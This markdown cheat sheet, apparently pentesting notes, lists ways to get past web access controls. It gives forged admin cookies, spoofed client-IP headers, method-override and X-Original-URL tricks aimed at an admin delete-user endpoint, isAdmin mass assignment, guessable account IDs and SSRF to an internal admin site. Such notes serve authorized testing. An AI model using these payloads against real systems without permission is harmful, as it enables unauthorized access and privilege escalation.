## Change Header Values

### Cookie

We may be able to get access to the login-required pages.

```txt
Cookie: admin=true
Cookie: isAdmin=true
Cookie: access=1
Cookie: access=true
```

<br />

### IP Spoofing

```txt
Cluster-Client-IP: 127.0.0.1
Forwarded-For: 127.0.0.1
X-Forwarded: 127.0.0.1
X-Forwarded-For: 127.0.0.1
X-Original-URL: 127.0.0.1
X-Originating-IP: 127.0.0.1
X-ProxyUser-IP: 127.0.0.1
X-Remote-Addr: 127.0.0.1
X-Remote-IP: 127.0.0.1

Host: 127.0.0.1
```

<br />

### User Agent

Sometimes we can access another server by replacing the User Agent with the specific one.

```bash
User-Agent: <custom_user_agent>
```

<br /><br />

## Change Methods

```sh
GET, POST, PUT, DELETE, HEAD, TRACE, OPTIONS, PATCH, INVENTED, CONNECT, etc.

# Override to bypass FireWall (via POST /example HTTP/1.1)
X-Method-Override: PUT
X-HTTP-Method-Override: PUT
```

<br /><br />

## POST Parameters

```sh
POST / HTTP/1.1
...

{
    "email": "new-email@example.com",
    "isAdmin": true
}
```

<br />

### X-Original-URL, X-Rewrite-URL

```sh
POST / HTTP/1.1

...
X-Original-URL: /admin/deleteuser
# or
X-Rewrite-URL: /admin/deleteuser
...

username=michael
```

<br /><br />

## GET Parameters

```sh
https://vulnerable.com/account?id=michael
https://vulnerable.com/account?id=admin
https://vulnerable.com/account?id=administrator

# GUID cannot be guessed but it may be found somewhere in the website.
https://vulnerable.com/account?id=7230b2a9-60de-4409-a350-cd14986a8d3e
https://vulnerable.com/account?id=1de655cb-29d7-4008-b434-e688b39f9564
```

<br /><br />

## Access Page via SSRF

If there is another website that is owned by same orginazation, we may be able to see the target website with SSRF.

```bash
https://example.com?url=https://admin.example.com/
```
